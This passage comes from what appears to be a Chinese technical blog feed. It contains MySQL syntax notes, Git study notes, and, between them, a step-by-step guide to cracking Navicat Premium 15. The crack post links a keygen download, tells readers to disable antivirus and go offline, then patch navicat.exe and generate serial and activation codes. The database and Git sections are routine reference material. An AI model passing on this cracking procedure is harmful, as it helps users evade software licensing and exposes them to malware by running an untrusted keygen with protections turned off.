表名 set 字段1&#x3D;值1[,字段2&#x3D;值2,字段3&#x3D;值3····] [where 子句] [limit 子句];<br></code></pre></div></td></tr></table></figure><h4 id="4-8-删除数据"><a href="#4-8-删除数据" class="headerlink" title="4.8 删除数据"></a>4.8 删除数据</h4><h5 id="4-8-1"><a href="#4-8-1" class="headerlink" title="4.8.1"></a>4.8.1</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">delete from 表名 [where 子句] [order by 子句] [limit 子句];<br></code></pre></div></td></tr></table></figure><p><strong>如果不使用 where 条件，将删除所有数据。</strong></p><h5 id="4-8-2"><a href="#4-8-2" class="headerlink" title="4.8.2"></a>4.8.2</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">truncate table 表名;<br></code></pre></div></td></tr></table></figure><p><strong>删除表中全部数据。</strong></p><h3 id="4-8-显示表的详细索引信息"><a href="#4-8-显示表的详细索引信息" class="headerlink" title="4.8 显示表的详细索引信息"></a>4.8 显示表的详细索引信息</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show index from 表名;<br></code></pre></div></td></tr></table></figure><h2 id="5-查看版本支持的数据库存储引擎"><a href="#5-查看版本支持的数据库存储引擎" class="headerlink" title="5.查看版本支持的数据库存储引擎"></a>5.查看版本支持的数据库存储引擎</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show engines \G;<br></code></pre></div></td></tr></table></figure><h2 id="6-数据类型"><a href="#6-数据类型" class="headerlink" title="6.数据类型"></a>6.数据类型</h2><h3 id="6-1-数值类型"><a href="#6-1-数值类型" class="headerlink" title="6.1 数值类型"></a>6.1 数值类型</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">tinyint<br>smallint<br>mediumint<br>int或integer<br>bigint<br>float<br>double<br>decimal<br></code></pre></div></td></tr></table></figure><h3 id="6-2-日期和时间类型"><a href="#6-2-日期和时间类型" class="headerlink" title="6.2 日期和时间类型"></a>6.2 日期和时间类型</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysqll">date &#x2F;&#x2F;YYYY-MM-DD<br>time &#x2F;&#x2F;HH:MM:SS<br>year &#x2F;&#x2F;YYYY<br>datetime &#x2F;&#x2F;YYYY-MM-DD HH:MM:SS<br>timestamp &#x2F;&#x2F;YYYYMMDD HHMMSS<br></code></pre></div></td></tr></table></figure><h3 id="6-3-字符串类型"><a href="#6-3-字符串类型" class="headerlink" title="6.3 字符串类型"></a>6.3 字符串类型</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">char &#x2F;&#x2F;定长字符串<br>varchar &#x2F;&#x2F;变长字符串<br>tinyblob &#x2F;&#x2F;不超过255个字符的二进制字符串<br>tinytext &#x2F;&#x2F;短文本字符串<br>blob &#x2F;&#x2F;长文本数据<br>text &#x2F;&#x2F;二进制形式的中等长度文本数据<br>mediumblob &#x2F;&#x2F;中等长度文本数据<br>mediumtext &#x2F;&#x2F;<br>longblob<br>longtext<br></code></pre></div></td></tr></table></figure><h2 id="7-查询数据（select）"><a href="#7-查询数据（select）" class="headerlink" title="7.查询数据（select）"></a>7.查询数据（select）</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select 字段1，字段2····<br>from 表名;<br></code></pre></div></td></tr></table></figure><h2 id="8-where子句"><a href="#8-where子句" class="headerlink" title="8.where子句"></a>8.where子句</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select 数据1，数据2，···· from 表名1，表名2·····<br>where 条件1 [and 或者 or] 条件2····;<br></code></pre></div></td></tr></table></figure><p>表之间使用逗号（，）分割，并使用 WHERE 语句来设定查询条件。可以使用AND或者OR指定一个或多个条件。</p><p>以 A=10，B=20 为例：</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">=</td><td align="center">等号，检测两个值是否相等，如果相等返回true</td><td align="center">(A = B) 返回false。</td></tr><tr><td align="center">&lt;&gt; 或 !=</td><td align="center">不等于，检测两个值是否相等，如果不相等返回true</td><td align="center">(A != B) 返回 true。</td></tr><tr><td align="center">&gt;</td><td align="center">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td><td align="center">(A &gt; B) 返回false。</td></tr><tr><td align="center">&lt;</td><td align="center">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td><td align="center">(A &lt; B) 返回 true。</td></tr><tr><td align="center">&gt;=</td><td align="center">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td><td align="center">(A &gt;= B) 返回false。</td></tr><tr><td align="center">&lt;=</td><td align="center">小于等于号，检测左边的值是否小于于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td><td align="center">(A &lt;= B) 返回 true。</td></tr></tbody></table><h2 id="9-update更新"><a href="#9-update更新" class="headerlink" title="9.update更新"></a>9.update更新</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">update 表名 set 字段1&#x3D;新值，字段2&#x3D;新值;<br></code></pre></div></td></tr></table></figure><p>可以同时更新一个或多个字段。也可以在后面加上 WHERE 子句来指定任何条件，更新数据表中指定行的数据时 WHERE 子句是非常有用的。</p><h2 id="10-delete语句"><a href="#10-delete语句" class="headerlink" title="10.delete语句"></a>10.delete语句</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">delete from 表名;<br></code></pre></div></td></tr></table></figure><p>如果没有指定 WHERE 子句，MySQL表中的所有记录将被删除。可以在 WHERE 子句中指定任何条件，想删除数据表中指定的记录时 WHERE 子句是非常有用的。</p><h2 id="11-like语句"><a href="#11-like语句" class="headerlink" title="11.like语句"></a>11.like语句</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select 字段1，字段2，···字段n<br>from 表名1，表名2，···表名<br>where 字段1 like 条件 [and 或者 or] 字段2&#x3D;&#39;其他值&#39;;<br></code></pre></div></td></tr></table></figure><p>可以在WHERE子句中指定任何条件，可以在WHERE子句中使用LIKE子句。使用LIKE子句代替等号(=)。LIKE 通常与 % 一同使用，类似于一个元字符的搜索。</p><h2 id="12-排序（order-by）"><a href="#12-排序（order-by）" class="headerlink" title="12.排序（order by）"></a>12.排序（order by）</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select 字段1，字段2，···字段n from<br>表名1，表名2，···<br>order by 字段1，[字段2，····] [asc 或者 desc]<br></code></pre></div></td></tr></table></figure><p>可以使用任何字段来作为排序的条件，从而返回排序后的查询结果。使用 ASC 或 DESC 关键字来设置查询结果是按升序或降序排列。 默认情况下，它是按升排列。</p><h2 id="13-分组"><a href="#13-分组" class="headerlink" title="13.分组"></a>13.分组</h2><p>根据一个或多个列对结果集进行分组。在分组的列上可以使用 COUNT, SUM, AVG,等函数。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select 字段名，function(字段名)<br>from 表名<br>where 字段名 operator value<br>group by 字段名;&#x2F;&#x2F;是按照这个字段名进行分组<br></code></pre></div></td></tr></table></figure><h3 id="13-1-使用-with-rollup"><a href="#13-1-使用-with-rollup" class="headerlink" title="13.1 使用 with rollup"></a>13.1 使用 with rollup</h3><p>WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select 字段名，function(字段名)<br>from 表名<br>where 字段名 operator value<br>group by 字段名 &#x2F;&#x2F;是按照这个字段名进行分组，这个一般与输出的字段名一样<br>with rollup;<br></code></pre></div></td></tr></table></figure><h2 id="14-查看当前数据库名称"><a href="#14-查看当前数据库名称" class="headerlink" title="14.查看当前数据库名称"></a>14.查看当前数据库名称</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select database();<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>MySQL数据库</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL-数据库管理工具Navicat Premium v15.0.22 中文安装及破解</title>
    <link href="/2021/06/03/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7Navicat%20Premium%20v15.0.22%20%E4%B8%AD%E6%96%87%E5%AE%89%E8%A3%85%E5%8F%8A%E7%A0%B4%E8%A7%A3/"/>
    <url>/2021/06/03/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7Navicat%20Premium%20v15.0.22%20%E4%B8%AD%E6%96%87%E5%AE%89%E8%A3%85%E5%8F%8A%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>Navicat premium 是一款数据库管理工具，是一个可多重连线资料库的管理工具，可以让你以单一程式同时连线到 MySQL、SQLite、Oracle、MariaDB、Mssql、及PostgreSQL 资料库，让管理不同类型的资料库更加的方便。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-软件及注册机下载"><a href="#1-软件及注册机下载" class="headerlink" title="1.软件及注册机下载"></a>1.软件及注册机下载</h2><p>链接：<a href="https://pan.baidu.com/s/1557K0n97MhPSelzSc8uYyw">https://pan.baidu.com/s/1557K0n97MhPSelzSc8uYyw</a><br>提取码：jkt3 </p><h2 id="2-注意"><a href="#2-注意" class="headerlink" title="2.注意"></a>2.注意</h2><ol><li>运行注册机时最好关闭电脑的杀毒软件；</li><li>运行注册机请断网，无需将注册机放到Navicat Premium安装目录下；</li><li>请选择对各个版本，Products 那块；</li><li>安装完成后不要运行软件，然后打开注册机。</li></ol><h2 id="3-激活方法"><a href="#3-激活方法" class="headerlink" title="3. 激活方法"></a>3. 激活方法</h2><blockquote><ol><li>运行注册机，勾选 Backup、Host和Navicat v15，如图所示。然后点击Patch按钮，找到Navicat Premium 15安装路径下的navicat.exe，选中并点击打开，此时会提示：navicat.exe - x64 -&gt; Cracked，提示已破解。</li></ol></blockquote><blockquote><ol start="2"><li>点击下图的红色箭头所指的Generate，将自动生成Serial Keygen（即注册码），然后复制上。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210603154802604.png"></p><blockquote><ol start="3"><li>现在打开 Navicat Premium 15，点击注册（或菜单栏的帮助——》注册），输入上一步生成的注册码，然后点击激活，紧接着点手动激活。</li></ol></blockquote><blockquote><ol start="4"><li>将Navicat手动激活窗口的请求码框中内容复制到注册机Request Code框中，点击Activation Code下面的Generate按钮。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210603154820813.png"></p><blockquote><ol start="5"><li>将注册机Activation Code处生成的激活码内容复制到Navicat激活码框中激活即可。</li></ol></blockquote><p><strong>若多次激活失败，请先卸载已安装的Navicat Premium并清理残留文件夹和注册表，重启电脑，再尝试激活。</strong></p>]]></content>
    
    
    <categories>
      
      <category>MySQL数据库</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Git学习笔记</title>
    <link href="/2021/06/03/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/06/03/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>Git （分布式版本控制系统）。是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。Git 是用于 Linux内核开发的版本控制工具。与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式。</p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Git安装"><a href="#1-Git安装" class="headerlink" title="1.Git安装"></a>1.Git安装</h2><p>可以去官网下载：<a href="https://git-scm.com/">https://git-scm.com/</a> ，但下载速度较慢。<br>也可以在淘宝镜像下载：<a href="http://npm.taobao.org/mirrors/git-for-windows/">http://npm.taobao.org/mirrors/git-for-windows/</a></p><p>除了安装目录可以自己换成自己的，其他的默认即可。安装成功后，在开始菜单中会有三个 Git 项，或者桌面或任意文件夹下右键可以看到对应的程序。其中，<br>Git Bash ：Unix 与 Linux 风格的命令行，使用最多的。<br>Git CMD ：Windows 风格的命令行。<br>Git GUI ：图像界面的 Git，不建议初学者使用。</p><p>在桌面或任意文件夹下打开 Git Bash ，可以按住 Ctrl + 鼠标滑轮 进行调整字体大小。</p><h2 id="2-基本的Linux命令"><a href="#2-基本的Linux命令" class="headerlink" title="2.基本的Linux命令"></a>2.基本的Linux命令</h2><blockquote><ol><li>cd</li></ol></blockquote><ul><li>改变目录。</li></ul><blockquote><ol start="2"><li>cd ..</li></ol></blockquote><ul><li>回退到上一个目录。</li></ul><blockquote><ol start="3"><li>pwd</li></ol></blockquote><ul><li>显示当前所在的目录路径。</li></ul><blockquote><ol start="4"><li>ls 或者 ll</li></ol></blockquote><ul><li>都是列出当前目录中的所有文件，只不过后者列出的内容更加详细。</li></ul><blockquote><ol start="5"><li>touch</li></ol></blockquote><ul><li>新建一个文件。如 touch index.js ，会在当前目录下新建一个 index.js 的文件。</li></ul><blockquote><ol start="6"><li>rm</li></ol></blockquote><ul><li>删除一个文件。如 rm index.js ，会把 index.js 文件删除。</li></ul><blockquote><ol start="7"><li>mkdir</li></ol></blockquote><ul><li>新建一个目录（文件夹）。</li></ul><blockquote><ol start="8"><li>rm -r</li></ol></blockquote><ul><li>删除一个文件夹，rm -r src 就是删除 src 目录。</li></ul><blockquote><ol start="9"><li>mv</li></ol></blockquote><ul><li>移动文件，mv index.html src ，把 index.html 文件移到 src 目标文件夹下。但需要注意的是，必须要保证文件和目标文件夹在同一目录下。</li></ul><blockquote><ol start="10"><li>reset</li></ol></blockquote><ul><li>重新初始化终端（清屏）。</li></ul><blockquote><ol start="11"><li>clear</li></ol></blockquote><ul><li>清屏。</li></ul><blockquote><ol start="12"><li>history </li></ol></blockquote><ul><li>查看命令历史。</li></ul><blockquote><ol start="13"><li>help </li></ol></blockquote><ul><li>帮助。</li></ul><blockquote><ol start="14"><li>exit</li></ol></blockquote><ul><li>退出。</li></ul><h2 id="3-Git配置"><a href="#3-Git配置" class="headerlink" title="3.Git配置"></a>3.Git配置</h2><p>所有的配置文件都保存在本地。即在自己电脑上是可以找到的。</p><h3 id="3-1-查看配置"><a href="#3-1-查看配置" class="headerlink" title="3.1 查看配置"></a>3.1 查看配置</h3><blockquote><ol><li>git config -l</li></ol></blockquote><p>一般是本地配置，新的电脑上会没有自己配置的东西。</p><blockquote><ol start="2"><li>git config –system –list</li></ol></blockquote><p>系统配置的。与本地配置的对比一下即可发现有不同之处（前提是之前自己有配置过）。</p><blockquote><ol start="3"><li>git config –global –list</li></ol></blockquote><p>本地用户自己配置的。这就是本地配置与系统配置的不同之处。而且这个是必须配置的。</p><h3 id="3-2-Git-相关的配置文件"><a href="#3-2-Git-相关的配置文件" class="headerlink" title="3.2 Git 相关的配置文件"></a>3.2 Git 相关的配置文件</h3><blockquote><ol><li>git config –system –list   系统级的</li></ol></blockquote><p>在 Git 的安装目录下的 etc 文件夹下的 gitconfig 文件中。</p><blockquote><ol start="2"><li>git config –global –list  当前登录用户的配置</li></ol></blockquote><p>在 C盘下的用户(user)文件夹下的 Administrator（这里是你自己电脑上的用户的名称，如：Loong）下的 .gitconfig 文件中。C:\user\Administrator\.gitconfig</p><h3 id="3-3-设置用户名与邮箱"><a href="#3-3-设置用户名与邮箱" class="headerlink" title="3.3 设置用户名与邮箱"></a>3.3 设置用户名与邮箱</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;loong&quot;</span> <span class="hljs-comment">#名称</span><br>git config --global user.email 123456789@qq.com <span class="hljs-comment">#邮箱</span><br></code></pre></div></td></tr></table></figure><h2 id="4-Git基本理论"><a href="#4-Git基本理论" class="headerlink" title="4.Git基本理论"></a>4.Git基本理论</h2><p>Git 本地有三个工作区域：工作目录（Working Directory）、暂存区（Stage/index）、资源库(本地仓库)（Repository 或 Git Directory）。如果再加上远程的 git 创库（Remote Directory）就可以分为四个工作区域。它们之间的转换关系为：</p><p><img src="https://img-blog.csdnimg.cn/20210601090432316.png"></p><ul><li>工作区：平时存放项目代码的地方。</li><li>暂存区：用于临时存放改动，事实上它只是一个文件，保存即将提交到文件列表信息。</li><li>仓库区（本地仓库）：安全存放数据的位置，这里面有提交到所有版本的数据。其中 HEAD 指向最新放入仓库的版本。</li><li>远程仓库：托管代码的服务器，可以简单的认为是项目组中的一台电脑用于远程数据交换。</li></ul><h2 id="5-Git项目搭建"><a href="#5-Git项目搭建" class="headerlink" title="5.Git项目搭建"></a>5.Git项目搭建</h2><p>工作目录（WorkSpace）一般就是希望 Git 帮助管理的文件夹，可以是项目的目录，也可以是一个空目录，不要有中文。</p><p><img src="https://img-blog.csdnimg.cn/2021060109103561.png"></p><h3 id="5-1-本地仓库搭建"><a href="#5-1-本地仓库搭建" class="headerlink" title="5.1 本地仓库搭建"></a>5.1 本地仓库搭建</h3><p>创建本地仓库有两种方法：一种是创建全新的仓库，另一种是克隆远程仓库。</p><blockquote><ol><li>创建全新的仓库</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 在当前目录新建一个Git代码库</span><br>git init<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>克隆远程仓库</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 克隆远程目录，是将远程服务器上的仓库完全镜像一份至本地。</span><br>git <span class="hljs-built_in">clone</span> url<br></code></pre></div></td></tr></table></figure><h2 id="6-Git文件操作"><a href="#6-Git文件操作" class="headerlink" title="6.Git文件操作"></a>6.Git文件操作</h2><p>文件有4种状态。版本控制就是对文件的版本控制，要对文件进行修改、提交等操作，首先要知道文件当前在什么状态，不然可能会提交了现在还不想提交的文件，或者要提交的文件没提交上。</p><blockquote><ol><li>文件状态 </li></ol></blockquote><ul><li>Untracked：未跟踪。此文件在文件夹中，但并没有加入到 git 库，不参与版本控制。通过 git add 状态变为 Staged 。</li><li>Unmodify：文件已经入库，未修改，即版本库中的文件快照内容与文件夹中完全一致。这种类型的文件有两种去处，如果它被修改，而变为 Modified。如果使用 git rm 移出版本库，则成为 Untracked 文件。</li><li>Modified：文件已修改，仅仅是修改，并没有进行其他的操作。这个文件也有两个去处，通过 git add 可进入暂存 Staged 状态；使用 git checkout 则丢弃修改过，返回到 Unmodify 状态，这个 git checkout 即从库中取出文件，覆盖当前修改！</li><li>Staged：暂存状态。执行 git commit 则将修改同步到库中，这时库中的文件和本地文件又变为一致，文件为 Unmodify 状态。执行 git reset HEAD filename 取消暂存，文件状态为 Modified。</li></ul><blockquote><ol start="2"><li>查看文件状态</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看指定文件状态</span><br>git status filename<br><span class="hljs-comment"># 查看所有文件状态</span><br>git status<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>忽略文件</li></ol></blockquote><p>如果不想把某些文件纳入版本控制中，如：数据库文件、临时文件、设计文件等。<br>在主目录下建立 “.gitignore” 文件，此文件有如下规则：</p><ol><li>忽略文件中的空行或以井号（#）开始的行将会被忽略。</li><li>可以使用 Linux 通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1，string2……}）代表可选的字符串等。</li><li>如果名称的最前面有一个感叹号（！），表示例外规则，将不被忽略。</li><li>如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略。即忽略此目录前面的文件。</li><li>如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。即忽略此目录后面的文件。</li></ol><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#为注释</span><br>*.txt<span class="hljs-comment">#忽略所有 .txt结尾的文件,上传时不会被选中</span><br>!lib.txt<span class="hljs-comment">#但lib.txt除外</span><br>/temp<span class="hljs-comment">#仅忽略项目根目录下的TODO文件，不包括其他目录temp</span><br>build/<span class="hljs-comment">#忽略build/目录下的所有文件</span><br>doc/*.txt<span class="hljs-comment">#会忽略 doc/notes.txt 但不包括 doc/server/arch.txt</span><br></code></pre></div></td></tr></table></figure><h2 id="7-配置SSH公钥"><a href="#7-配置SSH公钥" class="headerlink" title="7.配置SSH公钥"></a>7.配置SSH公钥</h2><h3 id="7-1-生成公钥"><a href="#7-1-生成公钥" class="headerlink" title="7.1 生成公钥"></a>7.1 生成公钥</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh-keygen -t rsa <span class="hljs-comment"># -t rsa 为加密方式</span><br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的邮箱&quot;</span><br></code></pre></div></td></tr></table></figure><p>这时，在C盘中的 用户（user）中的 Adminstr（以自己的名称为准）中，有一个 .ssh 的文件夹，其中的 .pub 就是公钥。还没有生成过的没有这个文件。需要先生成公钥才能看见。</p><h3 id="7-2-验证是否成功"><a href="#7-2-验证是否成功" class="headerlink" title="7.2 验证是否成功"></a>7.2 验证是否成功</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">//GitHub<br>ssh -T git@github.com<br>//Gitee<br>ssh -T git@gitee.com<br></code></pre></div></td></tr></table></figure><h2 id="8-Git操作命令"><a href="#8-Git操作命令" class="headerlink" title="8.Git操作命令"></a>8.Git操作命令</h2><h3 id="1-查看仓库当前的状态"><a href="#1-查看仓库当前的状态" class="headerlink" title="1. 查看仓库当前的状态"></a>1. 查看仓库当前的状态</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git status<br></code></pre></div></td></tr></table></figure><h3 id="2-查看修改内容"><a href="#2-查看修改内容" class="headerlink" title="2. 查看修改内容"></a>2. 查看修改内容</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git diff<br></code></pre></div></td></tr></table></figure><p>加上 文件名，如 git diff 文件 ，可以查看某个文件的修改内容。</p><h3 id="3-显示从最近到最远的提交日志"><a href="#3-显示从最近到最远的提交日志" class="headerlink" title="3. 显示从最近到最远的提交日志"></a>3. 显示从最近到最远的提交日志</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">log</span><br></code></pre></div></td></tr></table></figure><h3 id="4-命令历史"><a href="#4-命令历史" class="headerlink" title="4. 命令历史"></a>4. 命令历史</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git reflog<br></code></pre></div></td></tr></table></figure><h3 id="5-版本回退"><a href="#5-版本回退" class="headerlink" title="5. 版本回退"></a>5. 版本回退</h3><p>用 HEAD 表示当前版本，也就是最新的提交，上一个版本就是 HEAD^ ，上上个版本就是 HEAD^^ ，也可以写成 HEAD~n ，表示往上 n 个版本。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git reset --hard HEAD^<br></code></pre></div></td></tr></table></figure><p>也可以指定回到未来的某个版本，就需要写未来的版本号，只需前几位就可以，Git 会自动去找。但也不能只写一两位，因为可能存在多个版本号。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git reset --hard 版本号前几位<br></code></pre></div></td></tr></table></figure><h3 id="6-查看工作区和版本库里最新版本的区别"><a href="#6-查看工作区和版本库里最新版本的区别" class="headerlink" title="6. 查看工作区和版本库里最新版本的区别"></a>6. 查看工作区和版本库里最新版本的区别</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git diff HEAD -- readme.txt<br></code></pre></div></td></tr></table></figure><h3 id="7-撤销修改"><a href="#7-撤销修改" class="headerlink" title="7. 撤销修改"></a>7. 撤销修改</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git checkout -- readme.txt<br></code></pre></div></td></tr></table></figure><p>把 readme.txt 文件在工作区的修改全部撤销，但这里有两种情况：</p><ol><li>readme.txt 自修改后还没有被放到暂存区，现在撤销修改就回到和版本库一模一样的状态。</li><li>readme.txt 已经添加到暂存区后，又作了修改，现在撤销修改就回到添加到暂存区后的状态。</li></ol><p>总之就是回到最近一次的 git commit 或者 git add 时的状态。</p><p>用命令git reset HEAD &lt;file&gt;可以把暂存区的修改撤销掉（unstage），重新放回工作区：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git reset HEAD readme.txt<br></code></pre></div></td></tr></table></figure><h3 id="8-删除文件"><a href="#8-删除文件" class="headerlink" title="8. 